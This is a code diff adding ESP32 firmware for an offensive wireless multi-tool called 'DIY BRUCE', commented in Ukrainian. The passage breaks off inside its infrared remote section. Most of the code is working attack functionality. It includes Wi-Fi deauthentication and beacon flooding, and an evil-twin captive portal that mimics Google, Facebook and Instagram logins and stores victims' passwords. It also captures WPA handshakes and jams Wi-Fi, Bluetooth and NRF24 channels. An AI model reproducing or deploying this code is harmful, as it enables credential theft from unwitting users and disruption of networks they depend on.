@@ -1,0 +1,774 @@
+// =============================================
+//  DIY BRUCE v3.0 - FULL VERSION (ALL FUNCTIONS)
+//  ESP32 | OLED 128x64 | ВСІ АТАКИ | WEB | EVIL PORTAL
+// =============================================
+
+#include <U8g2lib.h>
+#include <Wire.h>
+#include <SPI.h>
+#include <RF24.h>
+#include <IRremote.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <esp_wifi.h>
+#include <EEPROM.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
+#include <BLEAdvertising.h>
+#include "icons.h"
+
+// ==================== ПІНИ ====================
+#define BTN_UP     15
+#define BTN_DOWN   13
+#define BTN_OK     12
+#define BTN_LEFT   14
+#define BTN_RIGHT  27
+#define BTN_BACK   26
+#define NRF_CE      4
+#define NRF_CSN     5
+#define IR_PIN     32
+
+// ==================== НАЛАШТУВАННЯ ====================
+#define AP_SSID     "DIY_BRUCE"
+#define AP_PASSWORD "bruce1234"
+#define WEB_PORT    80
+#define EEPROM_SIZE 4096
+
+// ==================== OLED ====================
+U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 22, 21);
+
+// ==================== ВЕБ-СЕРВЕР ====================
+WebServer server(WEB_PORT);
+DNSServer dnsServer;
+
+// ==================== МОДУЛІ МЕНЮ ====================
+struct MenuItem { const char* name; const unsigned char* icon; };
+MenuItem modules[] = {
+  { "WiFi",     wifi_bits     },
+  { "BLE",      ble_bits      },
+  { "NRF24",    nrf_bits      },
+  { "IR",       ir_bits       },
+  { "Settings", settings_bits }
+};
+const int MODULE_COUNT = 5;
+int moduleIdx = 0;
+
+const char* wifiSub[] = {"SCAN", "DEAUTH", "BEACON", "EVIL", "HANDSHAKE", "JAM", "MONITOR", "INFO", "SAVE PASS", "SHOW PASS", "CLEAR PASS", "SET CH", "STOP", "REBOOT"};
+const int WIFI_SIZE = 14;
+const char* bleSub[] = {"SCAN", "APPLEJUICE", "SAMSUNG", "ANDROID", "WINDOWS", "SPAM ALL", "JAM", "INFO", "STOP", "REBOOT"};
+const int BLE_SIZE = 10;
+const char* nrfSub[] = {"SCAN", "JAM", "SEND", "INFO", "SET CH", "STOP", "REBOOT"};
+const int NRF_SIZE = 7;
+const char* irSub[] = {"TV POWER", "TV VOL+", "TV VOL-", "TV MUTE", "TV CH+", "TV CH-", "AC POWER", "AC TEMP+", "AC TEMP-", "CUSTOM", "RECORD", "SEND RAW", "STOP", "REBOOT"};
+const int IR_SIZE = 14;
+const char* settSub[] = {"NRF CH", "BRIGHT", "WEB ON", "WEB OFF", "SHOW PASS", "SHOW HANDSHAKE", "FORMAT FS", "INFO", "REBOOT"};
+const int SETT_SIZE = 9;
+
+int subIdx = 0;
+enum State { S_MENU, S_SUBMENU, S_WIFI_SCAN, S_WIFI_DEAUTH, S_WIFI_BEACON, S_WIFI_EVIL, S_WIFI_HANDSHAKE, S_WIFI_JAM, S_WIFI_MON, S_WIFI_INFO, S_WIFI_SAVE, S_WIFI_SHOW, S_WIFI_CLEAR, S_WIFI_SETCH, S_BLE_SCAN, S_BLE_APPLE, S_BLE_SAMSUNG, S_BLE_ANDROID, S_BLE_WINDOWS, S_BLE_ALL, S_BLE_JAM, S_BLE_INFO, S_NRF_SCAN, S_NRF_JAM, S_NRF_SEND, S_NRF_INFO, S_NRF_SETCH, S_IR_TV, S_IR_AC, S_IR_CUST, S_IR_REC, S_IR_SEND, S_SET_NRF, S_SET_BRIGHT, S_SET_WEBON, S_SET_WEBOFF, S_SET_SHOWPASS, S_SET_SHOWHAND, S_SET_FORMAT, S_ABOUT };
+State curState = S_MENU;
+
+// ==================== HARDWARE ====================
+RF24 radio(NRF_CE, NRF_CSN);
+bool nrfOK = false;
+uint8_t nrfCh = 76;
+uint8_t contrast = 200;
+BLEScan* pBLEScan = nullptr;
+bool webRunning = false;
+
+// ==================== ЗМІННІ ДЛЯ АТАК ====================
+int networkCount = 0;
+String networkNames[50];
+uint8_t networkBSSID[50][6];
+int networkChannel[50];
+bool deauthActive = false;
+unsigned long deauthPackets = 0;
+bool beaconActive = false;
+unsigned long beaconPackets = 0;
+bool evilActive = false;
+bool wifiJamActive = false;
+bool handshakeCapturing = false;
+String currentTargetSSID = "";
+uint8_t targetBSSID[6];
+int eapolCount = 0;
+
+String capturedPasswords = "";
+String handshakes = "";
+int lastRSSI = -50;
+int bleFound = 0;
+bool nrfJamActive = false;
+unsigned long nrfJamPackets = 0;
+bool bleJamActive = false;
+bool bleSpamActive = false;
+String spamType = "";
+
+// ========== Evil Portal сторінки ==========
+const char* fakePageGoogle = R"rawliteral(<!DOCTYPE html><html><head><title>Google</title><style>body{background:#fff;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;}</style></head><body><div><h1>Google</h1><form action="/pass" method="POST"><input type="email" name="e" placeholder="Email"><input type="password" name="p" placeholder="Password"><button type="submit">Sign in</button></form></div></body></html>)rawliteral";
+const char* fakePageFacebook = R"rawliteral(<!DOCTYPE html><html><head><title>Facebook</title><style>body{background:#1877F2;text-align:center;padding:20px;}</style></head><body><div><h1>Facebook</h1><form action="/pass" method="POST"><input type="text" name="e" placeholder="Email or Phone"><input type="password" name="p" placeholder="Password"><button type="submit">Log In</button></form></div></body></html>)rawliteral";
+const char* fakePageInstagram = R"rawliteral(<!DOCTYPE html><html><head><title>Instagram</title><style>body{background:#fff;text-align:center;}</style></head><body><div><h1>Instagram</h1><form action="/pass" method="POST"><input type="text" name="e" placeholder="Phone, username or email"><input type="password" name="p" placeholder="Password"><button type="submit">Log In</button></form></div></body></html>)rawliteral";
+const char* fakePageGeneric = R"rawliteral(<!DOCTYPE html><html><head><title>WiFi Login</title><style>body{background:#f0f2f5;text-align:center;}</style></head><body><div><h2>WiFi Login</h2><form action="/pass" method="POST"><input type="password" name="p" placeholder="Password"><button type="submit">Connect</button></form></div></body></html>)rawliteral";
+
+// ========== Веб-адмінка ==========
+const char* adminPage = R"rawliteral(<!DOCTYPE html><html><head><title>DIY BRUCE</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#0a0a1a;color:#fff;font-family:sans-serif;padding:16px;}button{background:#ff6b35;border:none;padding:10px;margin:5px;border-radius:20px;color:#fff;}</style></head><body><h1>DIY BRUCE v3.0</h1><div><button onclick="fetch('/cmd?c=scan')">SCAN</button><button onclick="fetch('/cmd?c=deauth_start')">DEAUTH</button><button onclick="fetch('/cmd?c=beacon_start')">BEACON</button><button onclick="fetch('/cmd?c=evil_google')">EVIL GOOGLE</button><button onclick="fetch('/cmd?c=handshake')">HANDSHAKE</button><button onclick="fetch('/cmd?c=view_pass')">PASSWORDS</button><button onclick="fetch('/cmd?c=reset')">RESET</button></div><pre id="log"></pre><script>function fetch(url){fetch(url).then(r=>r.text()).then(t=>document.getElementById('log').innerText+=t+"\\n");}</script></body></html>)rawliteral";
+
+// ==================== ДЕБАУНС ====================
+unsigned long lastBtn = 0;
+#define DEBOUNCE 200
+bool btn(int pin) { if (!digitalRead(pin) && millis() - lastBtn > DEBOUNCE) { lastBtn = millis(); return true; } return false; }
+
+// ==================== UI ФУНКЦІЇ ====================
+void drawTopBar() {
+  char buf[10]; int s = (millis()/1000)%60, m = (millis()/60000)%60, h = (millis()/3600000)%24;
+  snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
+  u8g2.setFont(u8g2_font_6x13_tr); u8g2.drawStr(2, 9, buf);
+  u8g2.drawFrame(114, 1, 12, 6); u8g2.drawBox(126, 3, 2, 2); u8g2.drawBox(115, 2, 9, 4);
+  u8g2.setCursor(55, 9); u8g2.print("67%");
+  u8g2.setCursor(110, 9); u8g2.print(String(lastRSSI) + "dB");
+  u8g2.drawLine(0, 10, 128, 10);
+}
+
+void drawMainMenu() {
+  u8g2.clearBuffer(); drawTopBar();
+  u8g2.drawXBM(48, 16, 32, 32, modules[moduleIdx].icon);
+  u8g2.setFont(u8g2_font_9x15B_tr); u8g2.drawStr(4, 36, "<"); u8g2.drawStr(114, 36, ">");
+  u8g2.setFont(u8g2_font_7x13B_tr); int nw = u8g2.getStrWidth(modules[moduleIdx].name);
+  u8g2.drawStr((128 - nw) / 2, 58, modules[moduleIdx].name);
+  int dotX = (128 - MODULE_COUNT * 8) / 2;
+  for (int i = 0; i < MODULE_COUNT; i++) {
+    if (i == moduleIdx) u8g2.drawBox(dotX + i * 8, 55, 5, 5);
+    else u8g2.drawFrame(dotX + i * 8, 55, 5, 5);
+  }
+  u8g2.sendBuffer();
+}
+
+void drawSubMenu(const char* title, const char* items[], int size, int selected) {
+  u8g2.clearBuffer(); drawTopBar();
+  u8g2.drawBox(0, 0, 128, 12); u8g2.setDrawColor(0);
+  u8g2.setFont(u8g2_font_6x10_tr); int w = u8g2.getStrWidth(title);
+  u8g2.drawStr((128 - w) / 2, 10, title); u8g2.setDrawColor(1); u8g2.drawHLine(0, 12, 128);
+  for (int i = 0; i < size; i++) {
+    int y = 24 + i * 10;
+    if (i == selected) {
+      u8g2.drawBox(0, y - 8, 128, 10); u8g2.setDrawColor(0);
+      u8g2.drawStr(14, y, items[i]); u8g2.setDrawColor(1);
+    } else { u8g2.drawStr(14, y, items[i]); }
+  }
+  u8g2.drawHLine(0, 55, 128); u8g2.setFont(u8g2_font_5x7_tr);
+  u8g2.drawStr(2, 63, "UP/DN=sel OK=enter BACK=exit"); u8g2.sendBuffer();
+}
+
+void showMsg(const char* msg, int delayMs = 1500) {
+  u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+  u8g2.drawStr(10, 35, msg); u8g2.sendBuffer(); delay(delayMs);
+}
+void drawFtr(const char* t) { u8g2.drawHLine(0,55,128); u8g2.setFont(u8g2_font_5x7_tr); u8g2.drawStr(2,63,t); }
+
+// ==================== ЗБЕРЕЖЕННЯ ДАНИХ ====================
+void savePasswordsToEEPROM() {
+  EEPROM.begin(EEPROM_SIZE);
+  String allData = capturedPasswords + "\n" + handshakes;
+  for (int i = 0; i < allData.length() && i < EEPROM_SIZE; i++) {
+    EEPROM.write(i, allData[i]);
+  }
+  EEPROM.write(allData.length(), 0);
+  EEPROM.commit();
+}
+
+void loadPasswordsFromEEPROM() {
+  EEPROM.begin(EEPROM_SIZE);
+  String loaded = "";
+  for (int i = 0; i < EEPROM_SIZE; i++) {
+    char c = char(EEPROM.read(i));
+    if (c == 0) break;
+    loaded += c;
+  }
+  int passIdx = loaded.indexOf("PASSWORDS:\n");
+  int handIdx = loaded.indexOf("HANDSHAKES:\n");
+  if (passIdx != -1) capturedPasswords = loaded.substring(passIdx + 11, handIdx);
+  if (handIdx != -1) handshakes = loaded.substring(handIdx + 11);
+}
+
+void formatStorage() {
+  EEPROM.begin(EEPROM_SIZE);
+  for (int i = 0; i < EEPROM_SIZE; i++) EEPROM.write(i, 0);
+  EEPROM.commit();
+  capturedPasswords = "";
+  handshakes = "";
+  showMsg("FORMATTED!");
+}
+
+// ==================== ФУНКЦІЇ WIFI (14 функцій) ====================
+void scanWiFi() {
+  showMsg("SCANNING...");
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(200);
+  networkCount = WiFi.scanNetworks();
+  if (networkCount > 50) networkCount = 50;
+  for (int i = 0; i < networkCount; i++) {
+    networkNames[i] = WiFi.SSID(i);
+    networkChannel[i] = WiFi.channel(i);
+    memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
+  }
+  char buf[32]; sprintf(buf, "FOUND: %d", networkCount); showMsg(buf);
+  WiFi.mode(WIFI_AP_STA);
+}
+
+void sendDeauthPacket(uint8_t* bssid, uint8_t* client) {
+  uint8_t packet[] = {0xC0,0x00,0x00,0x00,client[0],client[1],client[2],client[3],client[4],client[5],bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],0x00,0x00,0x07,0x00};
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}
+
+void startWiFiDeauth() {
+  if (networkCount == 0) { showMsg("SCAN FIRST!"); return; }
+  deauthActive = true; deauthPackets = 0;
+  showMsg("DEAUTH STARTED");
+  while (deauthActive) {
+    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    if (networkCount > 0) sendDeauthPacket(networkBSSID[0], broadcast);
+    deauthPackets++;
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_helvB08_tr);
+    u8g2.drawStr(20, 28, "DEAUTH ACTIVE"); u8g2.setFont(u8g2_font_6x10_tr);
+    char buf[32]; sprintf(buf, "PKTS: %lu", deauthPackets);
+    u8g2.drawStr(5, 45, buf); u8g2.drawStr(5, 58, "BACK STOP"); u8g2.sendBuffer();
+    if (btn(BTN_BACK)) deauthActive = false;
+    delay(100);
+  }
+}
+
+void startWiFiBeacon() {
+  beaconActive = true; beaconPackets = 0;
+  showMsg("BEACON STARTED");
+  while (beaconActive) {
+    uint8_t bssid[6]; for(int i=0;i<6;i++) bssid[i]=random(256);
+    bssid[0]|=0x02; const char* ssid="FREE_WIFI"; uint8_t packet[128]; int len=0;
+    packet[len++]=0x80; packet[len++]=0x00; packet[len++]=0x00; packet[len++]=0x00;
+    for(int i=0;i<6;i++) packet[len++]=0xFF;
+    for(int i=0;i<6;i++) packet[len++]=bssid[i];
+    for(int i=0;i<6;i++) packet[len++]=bssid[i];
+    packet[len++]=0x00; packet[len++]=0x00;
+    for(int i=0;i<8;i++) packet[len++]=0x00;
+    packet[len++]=0x64; packet[len++]=0x00; packet[len++]=0x11; packet[len++]=0x00;
+    packet[len++]=0x00; packet[len++]=strlen(ssid);
+    for(int i=0;i<(int)strlen(ssid);i++) packet[len++]=ssid[i];
+    packet[len++]=0x01; packet[len++]=0x08; packet[len++]=0x82; packet[len++]=0x84;
+    packet[len++]=0x8B; packet[len++]=0x96; packet[len++]=0x24; packet[len++]=0x30;
+    packet[len++]=0x48; packet[len++]=0x6C; packet[len++]=0x03; packet[len++]=0x01;
+    packet[len++]=random(1,12);
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
+    beaconPackets++;
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_helvB08_tr);
+    u8g2.drawStr(20, 28, "BEACON ACTIVE"); u8g2.setFont(u8g2_font_6x10_tr);
+    char buf[32]; sprintf(buf, "SENT: %lu", beaconPackets);
+    u8g2.drawStr(5, 45, buf); u8g2.drawStr(5, 58, "BACK STOP"); u8g2.sendBuffer();
+    if(btn(BTN_BACK)) beaconActive=false;
+    delay(50);
+  }
+}
+
+void startEvilTwin(const char* page) {
+  if(evilActive) stopEvilTwin();
+  WiFi.softAP("FREE_WIFI", NULL); dnsServer.start(53, "*", WiFi.softAPIP());
+  server.on("/", [page](){ server.send(200,"text/html",page); });
+  server.on("/pass", HTTP_POST, [](){
+    String email = server.hasArg("e") ? server.arg("e") : "";
+    String pwd = server.hasArg("p") ? server.arg("p") : "";
+    if(pwd.length()>0 || email.length()>0){
+      capturedPasswords += "[PASS] " + (email.length()? "Email: " + email + " | " : "") + "Pass: " + pwd + "\n";
+      savePasswordsToEEPROM();
+    }
+    server.send(200,"text/html","<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
+  });
+  server.on("/cmd", handleCmd); server.on("/data", handleData);
+  server.begin(); evilActive=true;
+  showMsg("EVIL TWIN ACTIVE");
+  while(evilActive){
+    dnsServer.processNextRequest(); server.handleClient();
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_helvB08_tr);
+    u8g2.drawStr(20,28,"EVIL TWIN"); u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(5,45,"FREE_WIFI"); u8g2.drawStr(5,58,"BACK STOP"); u8g2.sendBuffer();
+    if(btn(BTN_BACK)){ stopEvilTwin(); evilActive=false; }
+    delay(100);
+  }
+}
+void stopEvilTwin() {
+  dnsServer.stop(); server.stop(); WiFi.softAPdisconnect(true);
+  server.on("/", handleRoot); server.on("/cmd", handleCmd); server.on("/data", handleData);
+  server.begin(); evilActive=false;
+}
+
+void startWiFiJammer() {
+  wifiJamActive=true; showMsg("WIFI JAM STARTED");
+  while(wifiJamActive){
+    for(int ch=1;ch<=11;ch++){
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      uint8_t packet[128];
+      for(int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+      delay(5);
+    }
+    if(btn(BTN_BACK)) wifiJamActive=false;
+    delay(50);
+  }
+}
+
+void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!handshakeCapturing) return;
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  int len = pkt->rx_ctrl.sig_len; uint8_t *payload = pkt->payload;
+  if (len < 30) return;
+  for (int i = 0; i < len - 8; i++) {
+    if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
+      eapolCount++;
+      handshakes += "[HANDSHAKE] " + currentTargetSSID + " | Time: " + String(millis()/1000) + "s\n";
+      savePasswordsToEEPROM();
+      showMsg("HANDSHAKE CAPTURED!");
+      handshakeCapturing = false; return;
+    }
+  }
+}
+
+void startHandshakeSniffer() {
+  if(networkCount==0){ showMsg("SCAN FIRST!"); return; }
+  int targetIdx=0;
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(5,30,"SELECT TARGET:");
+    for(int i=0;i<min(networkCount,5);i++){ int y=40+i*8;
+      if(i==targetIdx) u8g2.drawStr(5,y,">");
+      u8g2.drawStr(15,y,networkNames[i].substring(0,14).c_str());
+    }
+    u8g2.sendBuffer();
+    if(btn(BTN_UP) && targetIdx>0) targetIdx--;
+    else if(btn(BTN_DOWN) && targetIdx<min(networkCount,5)-1) targetIdx++;
+    else if(btn(BTN_OK)) break;
+    else if(btn(BTN_BACK)) return;
+    delay(50);
+  }
+  currentTargetSSID=networkNames[targetIdx];
+  memcpy(targetBSSID,networkBSSID[targetIdx],6);
+  esp_wifi_set_channel(networkChannel[targetIdx],WIFI_SECOND_CHAN_NONE);
+  eapolCount=0; handshakeCapturing=true;
+  showMsg("CAPTURING...");
+  unsigned long start=millis();
+  while(handshakeCapturing && millis()-start<30000){
+    uint8_t broadcast[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    sendDeauthPacket(targetBSSID,broadcast);
+    u8g2.clearBuffer(); drawTopBar(); char buf[32];
+    sprintf(buf,"EAPOL: %d",eapolCount); u8g2.drawStr(5,30,buf);
+    sprintf(buf,"Time: %d/30",(millis()-start)/1000); u8g2.drawStr(5,45,buf);
+    u8g2.drawStr(5,58,"BACK STOP"); u8g2.sendBuffer();
+    if(btn(BTN_BACK)) handshakeCapturing=false;
+    delay(100);
+  }
+  handshakeCapturing=false;
+  if(eapolCount>0) showMsg("HANDSHAKE CAPTURED!");
+  else showMsg("HANDSHAKE FAILED!");
+}
+
+void startWiFiMonitor() {
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+    char buf[32]; sprintf(buf, "RSSI: %d dBm", (int)WiFi.RSSI()); u8g2.drawStr(5,35,buf);
+    u8g2.sendBuffer(); if(btn(BTN_BACK)) break; delay(500);
+  }
+}
+
+void startWiFiInfo() {
+  u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+  u8g2.drawStr(5,30,"MAC: "); u8g2.drawStr(30,30,WiFi.macAddress().c_str());
+  char buf[20]; sprintf(buf,"CH: %d",WiFi.channel()); u8g2.drawStr(5,45,buf);
+  u8g2.sendBuffer(); while (!btn(BTN_BACK)) delay(50);
+}
+
+void saveWiFiPasswords() { savePasswordsToEEPROM(); showMsg("PASSWORDS SAVED!"); }
+void showWiFiPasswords() { showMsg(capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "NO PASSWORDS"); }
+void clearWiFiPasswords() { capturedPasswords = ""; handshakes = ""; savePasswordsToEEPROM(); showMsg("CLEARED!"); }
+void setWiFiChannel() {
+  int ch = 1;
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40,10,"WiFi Channel"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+    u8g2.setFont(u8g2_font_logisoso24_tr); char buf[8]; sprintf(buf,"%d",ch);
+    int w=u8g2.getStrWidth(buf); u8g2.drawStr((128-w)/2,46,buf);
+    u8g2.drawStr(8,30,"<"); u8g2.drawStr(110,30,">");
+    drawFtr("LR=change  OK=save  BACK"); u8g2.sendBuffer();
+    if(btn(BTN_LEFT) && ch>1) ch--;
+    else if(btn(BTN_RIGHT) && ch<14) ch++;
+    else if(btn(BTN_OK)){ esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); showMsg("CH SET!"); break; }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void stopWiFiAttack() { deauthActive = false; beaconActive = false; wifiJamActive = false; evilActive = false; handshakeCapturing = false; showMsg("ALL STOPPED!"); }
+
+// ==================== ФУНКЦІЇ BLE (10 функцій) ====================
+class MyCallbacks : public BLEAdvertisedDeviceCallbacks { void onResult(BLEAdvertisedDevice d) override { bleFound++; } };
+void scanBLE() {
+  bleFound=0; showMsg("BLE SCAN...");
+  BLEDevice::init(""); pBLEScan=BLEDevice::getScan();
+  pBLEScan->setAdvertisedDeviceCallbacks(new MyCallbacks()); pBLEScan->setActiveScan(true);
+  BLEScanResults *res=pBLEScan->start(5,false); bleFound=res->getCount();
+  char buf[32]; sprintf(buf,"FOUND: %d",bleFound); showMsg(buf);
+  pBLEScan->clearResults(); BLEDevice::deinit();
+}
+void startBLEAppleJuice() {
+  showMsg("APPLEJUICE SPAM");
+  BLEDevice::init("ESP_SPAM");
+  BLEAdvertising* pAdv=BLEDevice::getAdvertising();
+  for(int i=0;i<30;i++){
+    BLEAdvertisementData adv; adv.setFlags(0x06);
+    adv.setManufacturerData("4C00 0F05 0000 0000 0000 0000 0000 0000 0000 0000");
+    pAdv->setAdvertisementData(adv); pAdv->start(); delay(50); pAdv->stop();
+  }
+  BLEDevice::deinit(); showMsg("APPLEJUICE DONE");
+}
+void startBLESamsung() {
+  showMsg("SAMSUNG SPAM");
+  BLEDevice::init("ESP_SPAM");
+  BLEAdvertising* pAdv=BLEDevice::getAdvertising();
+  for(int i=0;i<30;i++){
+    BLEAdvertisementData adv; adv.setFlags(0x06);
+    adv.setName("Samsung_" + String(random(1000)));
+    pAdv->setAdvertisementData(adv); pAdv->start(); delay(50); pAdv->stop();
+  }
+  BLEDevice::deinit(); showMsg("SAMSUNG DONE");
+}
+void startBLEAndroid() {
+  showMsg("ANDROID SPAM");
+  BLEDevice::init("ESP_SPAM");
+  BLEAdvertising* pAdv=BLEDevice::getAdvertising();
+  for(int i=0;i<30;i++){
+    BLEAdvertisementData adv; adv.setFlags(0x06);
+    adv.setName("Android_" + String(random(1000)));
+    pAdv->setAdvertisementData(adv); pAdv->start(); delay(50); pAdv->stop();
+  }
+  BLEDevice::deinit(); showMsg("ANDROID DONE");
+}
+void startBLEWindows() {
+  showMsg("WINDOWS SPAM");
+  BLEDevice::init("ESP_SPAM");
+  BLEAdvertising* pAdv=BLEDevice::getAdvertising();
+  for(int i=0;i<30;i++){
+    BLEAdvertisementData adv; adv.setFlags(0x06);
+    adv.setName("Windows_" + String(random(1000)));
+    pAdv->setAdvertisementData(adv); pAdv->start(); delay(50); pAdv->stop();
+  }
+  BLEDevice::deinit(); showMsg("WINDOWS DONE");
+}
+void startBLESpamAll() { startBLEAppleJuice(); startBLESamsung(); startBLEAndroid(); startBLEWindows(); }
+void startBLEJammer() {
+  bleJamActive=true; showMsg("BLE JAM STARTED");
+  while(bleJamActive){
+    BLEDevice::init(("JAM_" + String(random(9999))).c_str());
+    BLEDevice::deinit(); delay(30);
+    if(btn(BTN_BACK)) bleJamActive=false;
+  }
+  showMsg("BLE JAM STOPPED");
+}
+void startBLEInfo() {
+  u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+  u8g2.drawStr(5,30,"BLE Info"); u8g2.drawStr(5,45,BLEDevice::getAddress().toString().c_str());
+  u8g2.sendBuffer(); while (!btn(BTN_BACK)) delay(50);
+}
+void stopBLEAttack() { bleJamActive = false; showMsg("BLE STOPPED"); }
+
+// ==================== ФУНКЦІЇ NRF24 (10 функцій) ====================
+void scanNRF() {
+  if(!radio.isChipConnected()){ showMsg("NRF24 NOT FOUND!"); return; }
+  int active=0; showMsg("NRF SCAN...");
+  for(int ch=0;ch<=125;ch++){ radio.setChannel(ch); radio.startListening(); delayMicroseconds(200); if(radio.testCarrier()) active++; radio.stopListening(); }
+  radio.setChannel(nrfCh); char buf[32]; sprintf(buf,"ACTIVE: %d",active); showMsg(buf);
+}
+void startNRFJammer() {
+  if(!radio.isChipConnected()){ showMsg("NRF24 NOT FOUND!"); return; }
+  nrfJamActive=true; nrfJamPackets=0; radio.setAutoAck(false); radio.setPayloadSize(32);
+  showMsg("NRF JAM STARTED");
+  while(nrfJamActive){
+    for(int ch=0;ch<125 && nrfJamActive;ch++){
+      radio.setChannel(ch); uint8_t junk[32];
+      for(int i=0;i<32;i++) junk[i]=random(256);
+      radio.stopListening(); radio.write(&junk,32); nrfJamPackets++; delay(1);
+    }
+    if(btn(BTN_BACK)) nrfJamActive=false;
+  }
+  radio.stopListening(); radio.setChannel(nrfCh);
+}
+void startNRFSend() {
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(5,30,"NRF24 Sender"); char buf[20]; sprintf(buf,"CH: %d",nrfCh); u8g2.drawStr(5,45,buf);
+    drawFtr("OK=send  BACK=exit"); u8g2.sendBuffer();
+    if(btn(BTN_OK)){
+      if(radio.isChipConnected()){ radio.stopListening(); byte addr[6]="00001"; radio.openWritingPipe(addr); char msg[]="HELLO"; radio.write(msg,sizeof(msg)); showMsg("SENT!"); }
+      u8g2.clearBuffer(); drawTopBar(); u8g2.drawStr(5,30,"NRF24 Sender"); sprintf(buf,"CH: %d",nrfCh); u8g2.drawStr(5,45,buf); u8g2.sendBuffer();
+    }
+    if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void startNRFInfo() {
+  u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+  char buf[32]; sprintf(buf, "Status: %s", radio.isChipConnected()?"OK":"ERROR"); u8g2.drawStr(5,30,buf);
+  sprintf(buf, "CH: %d", nrfCh); u8g2.drawStr(5,45,buf);
+  u8g2.sendBuffer(); while (!btn(BTN_BACK)) delay(50);
+}
+void setNRFChannel() {
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40,10,"NRF Channel"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+    u8g2.setFont(u8g2_font_logisoso24_tr); char buf[8]; sprintf(buf,"%d",nrfCh);
+    int w=u8g2.getStrWidth(buf); u8g2.drawStr((128-w)/2,46,buf);
+    u8g2.drawStr(8,30,"<"); u8g2.drawStr(110,30,">");
+    drawFtr("LR=change  OK=save  BACK"); u8g2.sendBuffer();
+    if(btn(BTN_LEFT) && nrfCh>0) nrfCh--;
+    else if(btn(BTN_RIGHT) && nrfCh<125) nrfCh++;
+    else if(btn(BTN_OK)){ EEPROM.write(0,nrfCh); EEPROM.commit(); if(radio.isChipConnected()) radio.setChannel(nrfCh); showMsg("SAVED!"); break; }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void stopNRFAttack() { nrfJamActive = false; showMsg("NRF STOPPED"); }
+
+// ==================== ФУНКЦІЇ IR (14 функцій) ====================
+void sendIRCode(uint32_t address, uint32_t command) { IrSender.sendNEC(address, command, 0); showMsg("IR SENT!"); }
+void drawIR_TV() {
+  const char* tvCmds[]={"Power","Vol+","Vol-","Mute","CH+","CH-"};
+  uint32_t codes[]={0xE0E040BF,0xE0E0E01F,0xE0E0D02F,0xE0E0F00F,0xE0E048B7,0xE0E008F7};
+  int tvCnt=6, tvIdx=0;
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40,10,"TV Remote"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+    for(int i=0;i<tvCnt;i++){ int y=24+i*8; if(i==tvIdx) u8g2.drawStr(5,y,">"); u8g2.drawStr(15,y,tvCmds[i]); }
+    drawFtr("UP/DN=sel OK=send BACK"); u8g2.sendBuffer();
+    if(btn(BTN_UP)) tvIdx=(tvIdx-1+tvCnt)%tvCnt;
+    else if(btn(BTN_DOWN)) tvIdx=(tvIdx+1)%tvCnt;
+    else if(btn(BTN_OK)){ IrSender.sendNEC(0xE0E0,codes[tvIdx]&0xFFFF,0); showMsg("IR SENT!"); }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void drawIR_AC() {
+  const char* acCmds[]={"Power","Temp+","Temp-","Mode","Fan+","Fan-"};
+  uint32_t codes[]={0x12340001,0x12340002,0x12340003,0x12340004,0x12340005,0x12340006};
+  int acCnt=6, acIdx=0;
+  while(true){
